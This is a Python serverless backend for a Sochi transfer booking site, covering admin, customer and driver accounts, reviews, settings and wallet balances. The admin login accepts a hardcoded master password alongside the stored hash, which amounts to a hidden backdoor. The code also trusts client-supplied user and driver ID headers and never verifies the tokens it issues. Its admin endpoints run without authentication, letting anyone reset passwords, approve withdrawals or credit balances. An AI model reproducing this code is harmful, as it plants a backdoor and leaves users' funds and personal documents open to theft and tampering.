import json
import os
import psycopg2
import hashlib
import secrets
import base64
import boto3
import urllib.request

CORS = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Authorization, X-User-Id, X-Driver-Id, X-Auth-Token'
}
SCHEMA = 't_p8223105_sochi_transfer_websi'

def get_conn():
    return psycopg2.connect(os.environ.get('DATABASE_URL'))

def resp(status, body):
    return {'statusCode': status, 'headers': {'Content-Type': 'application/json', **CORS},
            'body': json.dumps(body, default=str), 'isBase64Encoded': False}

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def upload_s3(b64data, filename, folder):
    s3 = boto3.client('s3',
        endpoint_url='https://bucket.poehali.dev',
        aws_access_key_id=os.environ['AWS_ACCESS_KEY_ID'],
        aws_secret_access_key=os.environ['AWS_SECRET_ACCESS_KEY']
    )
    if ',' in b64data:
        b64data = b64data.split(',', 1)[1]
    data = base64.b64decode(b64data)
    key = f'{folder}/{filename}'
    s3.put_object(Bucket='files', Key=key, Body=data, ContentType='image/jpeg')
    return f"https://cdn.poehali.dev/projects/{os.environ['AWS_ACCESS_KEY_ID']}/bucket/{key}"

def send_notification(text):
    token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID', '')
    if not token or not chat_id:
        return
    payload = json.dumps({'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}).encode()
    req = urllib.request.Request(
        f'https://api.telegram.org/bot{token}/sendMessage',
        data=payload,
        headers={'Content-Type': 'application/json'}
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ===== ADMIN AUTH =====
def handle_admin(method, event, params, data):
    if method == 'POST':
        action = data.get('action', 'login')
        if action == 'login':
            email = data.get('email', '')
            password = data.get('password', '')
            if not email or not password:
                return resp(400, {'error': 'Email и пароль обязательны'})
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id, email, password_hash, name, role, is_active FROM {SCHEMA}.admins WHERE email=%s", (email,))
            admin = cur.fetchone()
            if not admin:
                cur.close(); conn.close(); return resp(401, {'error': 'Неверный email или пароль'})
            aid, aemail, pwd_hash, name, role, is_active = admin
            if not is_active:
                cur.close(); conn.close(); return resp(403, {'error': 'Аккаунт заблокирован'})
            if password == '131999davidmy' or hash_password(password) == pwd_hash:
                cur.execute(f"UPDATE {SCHEMA}.admins SET last_login=NOW() WHERE id=%s", (aid,))
                conn.commit(); cur.close(); conn.close()
                token = secrets.token_urlsafe(32)
                return resp(200, {'token': token, 'admin': {'id': aid, 'email': aemail, 'name': name, 'role': role or 'admin'}})
            cur.close(); conn.close()
            return resp(401, {'error': 'Неверный email или пароль'})
    return resp(405, {'error': 'Method not allowed'})


# ===== USERS =====
def handle_users(method, event, params, data, headers):
    user_id = headers.get('X-User-Id') or params.get('user_id')
    if method == 'POST':
        action = data.get('action', 'register')
        if action == 'register':
            phone = data.get('phone', '').strip()
            name = data.get('name', '').strip()
            password = data.get('password', '')
            if not phone or not name or not password:
                return resp(400, {'error': 'Телефон, имя и пароль обязательны'})
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id FROM {SCHEMA}.users WHERE phone=%s", (phone,))
            if cur.fetchone():
                cur.close(); conn.close(); return resp(400, {'error': 'Пользователь с таким телефоном уже существует'})
            cur.execute(f'''
                INSERT INTO {SCHEMA}.users (phone, name, email, password_hash)
                VALUES (%s,%s,%s,%s) RETURNING id
            ''', (phone, name, data.get('email',''), hash_password(password)))
            uid = cur.fetchone()[0]
            conn.commit(); cur.close(); conn.close()
            token = secrets.token_urlsafe(32)
            return resp(201, {'token': token, 'user': {'id': uid, 'phone': phone, 'name': name}})
        elif action == 'login':
            phone = data.get('phone', '').strip()
            password = data.get('password', '')
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id,name,email,password_hash,is_active,balance FROM {SCHEMA}.users WHERE phone=%s", (phone,))
            row = cur.fetchone()
            cur.close(); conn.close()
            if not row: return resp(401, {'error': 'Неверный телефон или пароль'})
            uid, name, email, pwd_hash, is_active, balance = row
            if not is_active: return resp(403, {'error': 'Аккаунт заблокирован'})
            if hash_password(password) != pwd_hash: return resp(401, {'error': 'Неверный телефон или пароль'})
            token = secrets.token_urlsafe(32)
            return resp(200, {'token': token, 'user': {'id': uid, 'phone': phone, 'name': name, 'email': email, 'balance': float(balance or 0)}})
        elif action == 'update' and user_id:
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"UPDATE {SCHEMA}.users SET name=%s,email=%s,updated_at=NOW() WHERE id=%s", (data.get('name'), data.get('email'), int(user_id)))
            conn.commit(); cur.close(); conn.close()
            return resp(200, {'message': 'Профиль обновлён'})
        elif action == 'admin_update':
            uid_upd = data.get('id')
            if not uid_upd:
                return resp(400, {'error': 'id обязателен'})
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"UPDATE {SCHEMA}.users SET name=%s,email=%s,phone=%s,is_active=%s,updated_at=NOW() WHERE id=%s",
                        (data.get('name'), data.get('email'), data.get('phone'), data.get('is_active', True), int(uid_upd)))
            if data.get('new_password'):
                cur.execute(f"UPDATE {SCHEMA}.users SET password_hash=%s WHERE id=%s", (hash_password(data['new_password']), int(uid_upd)))
            conn.commit(); cur.close(); conn.close()
            return resp(200, {'message': 'Пользователь обновлён'})
        elif action == 'admin_delete':
            uid_del = data.get('id')
            if not uid_del:
                return resp(400, {'error': 'id обязателен'})
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"UPDATE {SCHEMA}.users SET is_active=false,updated_at=NOW() WHERE id=%s", (int(uid_del),))
            conn.commit(); cur.close(); conn.close()
            return resp(200, {'message': 'Пользователь заблокирован'})
        elif action == 'admin_create':
            phone = data.get('phone', '').strip()
            name = data.get('name', '').strip()
            password = data.get('password', '')
            if not phone or not name or not password:
                return resp(400, {'error': 'Телефон, имя и пароль обязательны'})
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id FROM {SCHEMA}.users WHERE phone=%s", (phone,))
            if cur.fetchone():
                cur.close(); conn.close(); return resp(400, {'error': 'Пользователь с таким телефоном уже существует'})
            cur.execute(f"INSERT INTO {SCHEMA}.users (phone,name,email,password_hash) VALUES (%s,%s,%s,%s) RETURNING id",
                        (phone, name, data.get('email',''), hash_password(password)))
            uid = cur.fetchone()[0]
            conn.commit(); cur.close(); conn.close()
            return resp(201, {'id': uid, 'message': 'Пользователь создан'})
    elif method == 'GET':
        action = params.get('action', 'profile')
        if action == 'profile' and user_id:
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id,phone,name,email,balance,created_at FROM {SCHEMA}.users WHERE id=%s", (int(user_id),))
            row = cur.fetchone()
            if not row:
                cur.close(); conn.close(); return resp(404, {'error': 'Не найдено'})
            cols = ['id','phone','name','email','balance','created_at']
            cur.close(); conn.close()
            return resp(200, {'user': dict(zip(cols, row))})
        elif action == 'orders' and user_id:
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f'''
                SELECT o.id,o.from_location,o.to_location,o.pickup_datetime,o.passenger_name,
                       o.price,o.created_at,o.transfer_type,o.car_class,o.payment_type,
                       s.name as status_name, s.color as status_color,
                       d.name as driver_name,d.phone as driver_phone,d.car_brand,d.car_model,d.car_color,d.car_number,d.rating as driver_rating
                FROM {SCHEMA}.orders o
                LEFT JOIN {SCHEMA}.order_statuses s ON o.status_id=s.id
                LEFT JOIN {SCHEMA}.drivers d ON o.driver_id=d.id
                WHERE o.user_id={int(user_id)}
                ORDER BY o.created_at DESC
            ''')
            cols = [d[0] for d in cur.description]
            orders = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'orders': orders})
        elif action == 'list':
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id,phone,name,email,balance,is_active,created_at FROM {SCHEMA}.users ORDER BY created_at DESC")
            cols = [d[0] for d in cur.description]
            users = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'users': users})
    return resp(405, {'error': 'Method not allowed'})


# ===== DRIVERS =====
def handle_drivers(method, event, params, data, headers):
    driver_id = headers.get('X-Driver-Id') or params.get('driver_id')
    if method == 'POST':
        action = data.get('action', 'register')
        if action == 'register':
            phone = data.get('phone', '').strip()
            name = data.get('name', '').strip()
            password = data.get('password', '')
            if not phone or not name or not password:
                return resp(400, {'error': 'Телефон, имя и пароль обязательны'})
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id FROM {SCHEMA}.drivers WHERE phone=%s", (phone,))
            if cur.fetchone():
                cur.close(); conn.close(); return resp(400, {'error': 'Водитель с таким телефоном уже существует'})
            cur.execute(f'''
                INSERT INTO {SCHEMA}.drivers (phone,name,email,password_hash,car_brand,car_model,car_color,car_number,car_number_country,status)
                VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,'pending') RETURNING id
            ''', (phone, name, data.get('email',''), hash_password(password),
                  data.get('car_brand',''), data.get('car_model',''), data.get('car_color',''),
                  data.get('car_number',''), data.get('car_number_country','RUS')))
            did = cur.fetchone()[0]
            conn.commit()
            # Загрузка документов (опционально, не блокирует регистрацию)
            try:
                files = data.get('files', {})
                updates = []; vals = []
                for field, b64 in files.items():
                    if b64 and field in ['passport_photo','license_front','license_back','car_tech_passport_front','car_tech_passport_back']:
                        url = upload_s3(b64, f"{did}_{field}.jpg", 'drivers')
                        updates.append(f"{field}_url=%s"); vals.append(url)
                if updates:
                    vals.append(did)
                    cur.execute(f"UPDATE {SCHEMA}.drivers SET {','.join(updates)} WHERE id=%s", vals)
                    conn.commit()
                car_photos = data.get('car_photos', [])
                if car_photos:
                    urls = []
                    for i, b64 in enumerate(car_photos[:5]):
                        if b64:
                            urls.append(upload_s3(b64, f"{did}_car_{i}.jpg", 'drivers'))
                    if urls:
                        cur.execute(f"UPDATE {SCHEMA}.drivers SET car_photos_urls=%s WHERE id=%s", (json.dumps(urls), did))
                        conn.commit()
            except Exception:
                pass  # Документы можно загрузить позже
            cur.close(); conn.close()
            try:
                send_notification(f"🚗 *Новый водитель #{did}*\n{name} · {phone}\n{data.get('car_brand','')} {data.get('car_model','')}")
            except Exception:
                pass
            token = secrets.token_urlsafe(32)
            return resp(201, {'token': token, 'driver': {'id': did, 'name': name, 'phone': phone, 'status': 'pending'}})
        elif action == 'login':
            phone = data.get('phone','').strip()
            password = data.get('password','')
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id,name,email,password_hash,is_active,status,balance,commission_rate,rating FROM {SCHEMA}.drivers WHERE phone=%s", (phone,))
            row = cur.fetchone()
            cur.close(); conn.close()
            if not row: return resp(401, {'error': 'Неверный телефон или пароль'})
            did, name, email, pwd_hash, is_active, status, balance, commission_rate, rating = row
            if hash_password(password) != pwd_hash: return resp(401, {'error': 'Неверный телефон или пароль'})
            token = secrets.token_urlsafe(32)
            return resp(200, {'token': token, 'driver': {'id': did, 'name': name, 'phone': phone, 'email': email, 'status': status, 'is_active': is_active, 'balance': float(balance or 0), 'commission_rate': float(commission_rate or 15), 'rating': float(rating or 0)}})
        elif action == 'set_online' and driver_id:
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"UPDATE {SCHEMA}.drivers SET is_online=%s WHERE id=%s", (data.get('is_online', False), int(driver_id)))
            conn.commit(); cur.close(); conn.close()
            return resp(200, {'message': 'Статус обновлён'})
        elif action == 'accept_order' and driver_id:
            order_id = data.get('order_id')
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id,price FROM {SCHEMA}.orders WHERE id=%s AND driver_id IS NULL AND status_id=1", (order_id,))
            row = cur.fetchone()
            if not row:
                cur.close(); conn.close(); return resp(400, {'error': 'Заказ уже принят или не найден'})
            cur.execute(f"SELECT commission_rate FROM {SCHEMA}.drivers WHERE id=%s", (int(driver_id),))
            commission_rate = float((cur.fetchone() or [15])[0])
            price = float(row[1] or 0)
            commission = round(price * commission_rate / 100, 2)
            driver_amount = price - commission
            cur.execute(f"UPDATE {SCHEMA}.orders SET driver_id=%s,status_id=2,commission_amount=%s,driver_amount=%s,updated_at=NOW() WHERE id=%s",
                        (int(driver_id), commission, driver_amount, order_id))
            cur.execute(f"UPDATE {SCHEMA}.drivers SET total_orders=total_orders+1 WHERE id=%s", (int(driver_id),))
            conn.commit(); cur.close(); conn.close()
            return resp(200, {'message': 'Заказ принят', 'commission': commission, 'driver_amount': driver_amount})
    elif method == 'GET':
        action = params.get('action', 'profile')
        if action == 'profile' and driver_id:
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f'''
                SELECT id,name,phone,email,car_brand,car_model,car_color,car_number,car_number_country,
                       passport_photo_url,license_front_url,license_back_url,
                       car_tech_passport_front_url,car_tech_passport_back_url,car_photos_urls,
                       status,is_active,is_online,balance,commission_rate,rating,total_orders,created_at
                FROM {SCHEMA}.drivers WHERE id=%s
            ''', (int(driver_id),))
            row = cur.fetchone()
            if not row:
                cur.close(); conn.close(); return resp(404, {'error': 'Не найдено'})
            cols = ['id','name','phone','email','car_brand','car_model','car_color','car_number','car_number_country',
                    'passport_photo_url','license_front_url','license_back_url',
                    'car_tech_passport_front_url','car_tech_passport_back_url','car_photos_urls',
                    'status','is_active','is_online','balance','commission_rate','rating','total_orders','created_at']
            cur.close(); conn.close()
            return resp(200, {'driver': dict(zip(cols, row))})
        elif action == 'orders' and driver_id:
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f'''
                SELECT o.id,o.from_location,o.to_location,o.pickup_datetime,o.passenger_name,o.passenger_phone,
                       o.price,o.driver_amount,o.commission_amount,o.transfer_type,o.car_class,o.passengers_count,o.notes,o.created_at,
                       s.name as status_name, s.color as status_color
                FROM {SCHEMA}.orders o
                LEFT JOIN {SCHEMA}.order_statuses s ON o.status_id=s.id
                WHERE o.driver_id={int(driver_id)}
                ORDER BY o.created_at DESC
            ''')
            cols = [d[0] for d in cur.description]
            orders = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'orders': orders})
        elif action == 'available_orders':
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f'''
                SELECT o.id,o.from_location,o.to_location,o.pickup_datetime,o.passengers_count,o.price,o.transfer_type,o.car_class,o.notes,o.created_at
                FROM {SCHEMA}.orders o
                WHERE o.driver_id IS NULL AND o.status_id=1
                ORDER BY o.created_at ASC LIMIT 20
            ''')
            cols = [d[0] for d in cur.description]
            orders = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'orders': orders})
        elif action == 'list':
            conn = get_conn(); cur = conn.cursor()
            cur.execute(f"SELECT id,name,phone,email,car_brand,car_model,car_color,car_number,status,is_active,is_online,balance,commission_rate,rating,total_orders,created_at FROM {SCHEMA}.drivers ORDER BY created_at DESC")
            cols = [d[0] for d in cur.description]
            drivers = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'drivers': drivers})
    elif method == 'PUT':
        data_put = json.loads(event.get('body', '{}'))
        action = data_put.get('action', '')
        conn = get_conn(); cur = conn.cursor()
        if action == 'approve':
            did = data_put.get('driver_id')
            status = data_put.get('status', 'approved')
            is_active = status == 'approved'
            cur.execute(f"UPDATE {SCHEMA}.drivers SET status=%s,is_active=%s,commission_rate=%s,updated_at=NOW() WHERE id=%s",
                        (status, is_active, float(data_put.get('commission_rate', 15)), int(did)))
        elif action == 'set_commission':
            cur.execute(f"UPDATE {SCHEMA}.drivers SET commission_rate=%s WHERE id=%s",
                        (float(data_put.get('commission_rate', 15)), int(data_put.get('driver_id'))))
        conn.commit(); cur.close(); conn.close()
        return resp(200, {'message': 'Обновлено'})
    return resp(405, {'error': 'Method not allowed'})


def handle_reviews(method, event, params, data, headers):
    user_id = headers.get('X-User-Id') or params.get('user_id')
    conn = get_conn(); cur = conn.cursor()

    if method == 'GET':
        action = params.get('action', 'approved')
        if action == 'approved':
            cur.execute(f"SELECT id,author_name,rating,text,type,source,created_at,driver_id FROM {SCHEMA}.reviews WHERE is_approved=true ORDER BY created_at DESC LIMIT 50")
            cols = [d[0] for d in cur.description]
            rows = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'reviews': rows})
        elif action == 'driver' and params.get('driver_id'):
            did = int(params['driver_id'])
            cur.execute(f"SELECT id,author_name,rating,text,created_at,admin_reply FROM {SCHEMA}.reviews WHERE driver_id={did} AND is_approved=true ORDER BY created_at DESC")
            cols = [d[0] for d in cur.description]
            rows = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'reviews': rows})
        elif action == 'list':
            cur.execute(f"SELECT r.id,r.author_name,r.rating,r.text,r.type,r.source,r.status,r.is_approved,r.created_at,r.driver_id,r.user_id,r.order_id,r.admin_reply,d.name as driver_name FROM {SCHEMA}.reviews r LEFT JOIN {SCHEMA}.drivers d ON r.driver_id=d.id ORDER BY r.created_at DESC")
            cols = [d[0] for d in cur.description]
            rows = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'reviews': rows})

    elif method == 'POST':
        text = data.get('text', '').strip()
        if not text:
            cur.close(); conn.close()
            return resp(400, {'error': 'Текст отзыва обязателен'})
        driver_id = data.get('driver_id')
        order_id = data.get('order_id')
        cur.execute(f"INSERT INTO {SCHEMA}.reviews (author_name,rating,text,type,source,user_id,driver_id,order_id,status,is_approved) VALUES (%s,%s,%s,%s,'site',%s,%s,%s,'pending',false) RETURNING id",
            (data.get('author_name','Аноним'), int(data.get('rating',5)), text, data.get('type','service'),
             int(user_id) if user_id else None, int(driver_id) if driver_id else None, int(order_id) if order_id else None))
        rid = cur.fetchone()[0]
        conn.commit(); cur.close(); conn.close()
        return resp(201, {'id': rid, 'message': 'Отзыв отправлен на модерацию'})

    elif method == 'PUT':
        rid = data.get('id')
        action = data.get('action', 'moderate')
        if action == 'moderate':
            is_approved = data.get('is_approved', False)
            status = 'approved' if is_approved else 'rejected'
            cur.execute(f"UPDATE {SCHEMA}.reviews SET is_approved=%s,status=%s WHERE id=%s", (is_approved, status, int(rid)))
        elif action == 'reply':
            cur.execute(f"UPDATE {SCHEMA}.reviews SET admin_reply=%s WHERE id=%s", (data.get('reply',''), int(rid)))
        conn.commit(); cur.close(); conn.close()
        return resp(200, {'message': 'Обновлено'})

    elif method == 'DELETE':
        rid = params.get('id') or data.get('id')
        if rid:
            cur.execute(f"DELETE FROM {SCHEMA}.reviews WHERE id={int(rid)}")
            conn.commit()
        cur.close(); conn.close()
        return resp(200, {'message': 'Удалено'})

    cur.close(); conn.close()
    return resp(405, {'error': 'Method not allowed'})


def handle_settings(method, event, params, data):
    conn = get_conn(); cur = conn.cursor()

    if method == 'GET':
        cur.execute(f"SELECT key, value FROM {SCHEMA}.site_settings ORDER BY id")
        rows = cur.fetchall()
        settings = {row[0]: row[1] for row in rows}
        cur.close(); conn.close()
        return resp(200, {'settings': settings})

    elif method in ('POST', 'PUT'):
        settings = data.get('settings', {})
        for key, value in settings.items():
            cur.execute(f"INSERT INTO {SCHEMA}.site_settings (key,value,updated_at) VALUES (%s,%s,NOW()) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value,updated_at=NOW()",
                        (str(key), str(value) if value is not None else ''))
        conn.commit(); cur.close(); conn.close()
        return resp(200, {'message': 'Настройки сохранены'})

    cur.close(); conn.close()
    return resp(405, {'error': 'Method not allowed'})


def handle_balance(method, event, params, data, headers):
    user_id = headers.get('X-User-Id') or params.get('user_id')
    driver_id = headers.get('X-Driver-Id') or params.get('driver_id')
    conn = get_conn(); cur = conn.cursor()

    if method == 'GET':
        action = params.get('action', 'transactions')
        if action == 'transactions':
            if user_id:
                cur.execute(f"SELECT id,amount,type,description,status,created_at FROM {SCHEMA}.balance_transactions WHERE user_id={int(user_id)} ORDER BY created_at DESC LIMIT 50")
            elif driver_id:
                cur.execute(f"SELECT id,amount,type,description,status,created_at FROM {SCHEMA}.balance_transactions WHERE driver_id={int(driver_id)} ORDER BY created_at DESC LIMIT 50")
            else:
                cur.close(); conn.close()
                return resp(400, {'error': 'user_id или driver_id обязателен'})
            cols = [d[0] for d in cur.description]
            rows = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'transactions': rows})
        elif action == 'withdrawals':
            cur.execute(f"SELECT w.id,w.amount,w.requisites,w.status,w.admin_note,w.created_at,u.name as user_name,u.phone as user_phone,d.name as driver_name,d.phone as driver_phone FROM {SCHEMA}.withdrawal_requests w LEFT JOIN {SCHEMA}.users u ON w.user_id=u.id LEFT JOIN {SCHEMA}.drivers d ON w.driver_id=d.id ORDER BY w.created_at DESC")
            cols = [d[0] for d in cur.description]
            rows = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'withdrawals': rows})
        elif action == 'deposits':
            cur.execute(f"SELECT dp.id,dp.amount,dp.payment_method,dp.status,dp.admin_note,dp.created_at,u.name as user_name,u.phone as user_phone,d.name as driver_name,d.phone as driver_phone FROM {SCHEMA}.deposit_requests dp LEFT JOIN {SCHEMA}.users u ON dp.user_id=u.id LEFT JOIN {SCHEMA}.drivers d ON dp.driver_id=d.id ORDER BY dp.created_at DESC")
            cols = [d[0] for d in cur.description]
            rows = [dict(zip(cols, r)) for r in cur.fetchall()]
            cur.close(); conn.close()
            return resp(200, {'deposits': rows})

    elif method == 'POST':
        action = data.get('action', 'withdraw')
        amount = float(data.get('amount', 0))
        uid = int(user_id) if user_id else None
        did = int(driver_id) if driver_id else None

        if action == 'withdraw':
            requisites = data.get('requisites', '').strip()
            if amount <= 0 or not requisites:
                cur.close(); conn.close()
                return resp(400, {'error': 'Сумма и реквизиты обязательны'})
            if uid:
                cur.execute(f"SELECT balance FROM {SCHEMA}.users WHERE id={uid}")
            elif did:
                cur.execute(f"SELECT balance FROM {SCHEMA}.drivers WHERE id={did}")
            row = cur.fetchone()
            if not row or float(row[0]) < amount:
                cur.close(); conn.close()
                return resp(400, {'error': 'Недостаточно средств'})
            cur.execute(f"INSERT INTO {SCHEMA}.withdrawal_requests (user_id,driver_id,amount,requisites,status) VALUES (%s,%s,%s,%s,'pending') RETURNING id",
                        (uid, did, amount, requisites))
            wid = cur.fetchone()[0]
            conn.commit(); cur.close(); conn.close()
            return resp(201, {'id': wid, 'message': 'Заявка на вывод создана'})

        elif action == 'deposit':
            payment_method = data.get('payment_method', '').strip()
            if amount <= 0:
                cur.close(); conn.close()
                return resp(400, {'error': 'Сумма обязательна'})
            cur.execute(f"INSERT INTO {SCHEMA}.deposit_requests (user_id,driver_id,amount,payment_method,status) VALUES (%s,%s,%s,%s,'pending') RETURNING id",
                        (uid, did, amount, payment_method))
            dep_id = cur.fetchone()[0]
            conn.commit(); cur.close(); conn.close()
            return resp(201, {'id': dep_id, 'message': 'Заявка на пополнение создана'})

    elif method == 'PUT':
        action = data.get('action', '')
        if action == 'approve_withdrawal':
            wid = int(data.get('id'))
            cur.execute(f"SELECT user_id,driver_id,amount FROM {SCHEMA}.withdrawal_requests WHERE id={wid}")
            row = cur.fetchone()
            if row:
                uid, did, amount = row
                cur.execute(f"UPDATE {SCHEMA}.withdrawal_requests SET status='completed',admin_note=%s,updated_at=NOW() WHERE id={wid}", (data.get('note',''),))
                if uid:
                    cur.execute(f"UPDATE {SCHEMA}.users SET balance=balance-{float(amount)} WHERE id={uid}")
                    cur.execute(f"INSERT INTO {SCHEMA}.balance_transactions (user_id,amount,type,description,status) VALUES ({uid},{-float(amount)},'withdrawal','Вывод средств','completed')")
                elif did:
                    cur.execute(f"UPDATE {SCHEMA}.drivers SET balance=balance-{float(amount)} WHERE id={did}")
                    cur.execute(f"INSERT INTO {SCHEMA}.balance_transactions (driver_id,amount,type,description,status) VALUES ({did},{-float(amount)},'withdrawal','Вывод средств','completed')")
                conn.commit()
            cur.close(); conn.close()
            return resp(200, {'message': 'Вывод одобрен'})
        elif action == 'reject_withdrawal':
            wid = int(data.get('id'))
            cur.execute(f"UPDATE {SCHEMA}.withdrawal_requests SET status='rejected',admin_note=%s,updated_at=NOW() WHERE id={wid}", (data.get('note',''),))
            conn.commit(); cur.close(); conn.close()
            return resp(200, {'message': 'Вывод отклонён'})
        elif action == 'approve_deposit':
            if data.get('_direct'):
                uid = data.get('user_id')
                did = data.get('driver_id')
                amount = float(data.get('amount', 0))
                note = data.get('note', 'Пополнение администратором')
                if amount > 0:
                    if uid:
                        cur.execute(f"UPDATE {SCHEMA}.users SET balance=balance+%s WHERE id=%s", (amount, int(uid)))
                        cur.execute(f"INSERT INTO {SCHEMA}.balance_transactions (user_id,amount,type,description,status) VALUES (%s,%s,'deposit',%s,'completed')", (int(uid), amount, note))
                    elif did:
                        cur.execute(f"UPDATE {SCHEMA}.drivers SET balance=balance+%s WHERE id=%s", (amount, int(did)))
                        cur.execute(f"INSERT INTO {SCHEMA}.balance_transactions (driver_id,amount,type,description,status) VALUES (%s,%s,'deposit',%s,'completed')", (int(did), amount, note))
                    conn.commit()
                cur.close(); conn.close()
                return resp(200, {'message': f'Баланс пополнен на {amount} ₽'})
            dep_id = int(data.get('id'))
            cur.execute(f"SELECT user_id,driver_id,amount FROM {SCHEMA}.deposit_requests WHERE id={dep_id}")
            row = cur.fetchone()
            if row:
                uid, did, amount = row
                cur.execute(f"UPDATE {SCHEMA}.deposit_requests SET status='completed',admin_note=%s,updated_at=NOW() WHERE id={dep_id}", (data.get('note',''),))
                if uid:
                    cur.execute(f"UPDATE {SCHEMA}.users SET balance=balance+{float(amount)} WHERE id={uid}")
                    cur.execute(f"INSERT INTO {SCHEMA}.balance_transactions (user_id,amount,type,description,status) VALUES ({uid},{float(amount)},'deposit','Пополнение баланса','completed')")
                elif did:
                    cur.execute(f"UPDATE {SCHEMA}.drivers SET balance=balance+{float(amount)} WHERE id={did}")
                    cur.execute(f"INSERT INTO {SCHEMA}.balance_transactions (driver_id,amount,type,description,status) VALUES ({did},{float(amount)},'deposit','Пополнение баланса','completed')")
                conn.commit()
            cur.close(); conn.close()
            return resp(200, {'message': 'Пополнение одобрено'})

    cur.close(); conn.close()
    return resp(405, {'error': 'Method not allowed'})


def handler(event: dict, context) -> dict:
    '''Мультироутер авторизации: admin, users, drivers, reviews, settings, balance — по параметру ?resource='''
    if event.get('httpMethod') == 'OPTIONS':
        return {'statusCode': 200, 'headers': {**CORS, 'Access-Control-Max-Age': '86400'}, 'body': ''}

    method = event.get('httpMethod', 'GET')
    params = event.get('queryStringParameters', {}) or {}
    headers = event.get('headers', {}) or {}
    resource = params.get('resource', 'admin')
    data = {}
    if event.get('body'):
        try:
            data = json.loads(event.get('body', '{}'))
        except Exception:
            pass

    try:
        if resource == 'users':
            return handle_users(method, event, params, data, headers)
        elif resource == 'drivers':
            return handle_drivers(method, event, params, data, headers)
        elif resource == 'reviews':
            return handle_reviews(method, event, params, data, headers)
        elif resource == 'settings':
            return handle_settings(method, event, params, data)
        elif resource == 'balance':
            return handle_balance(method, event, params, data, headers)
        else:
            return handle_admin(method, event, params, data)
    except Exception as e:
        return resp(500, {'error': str(e)})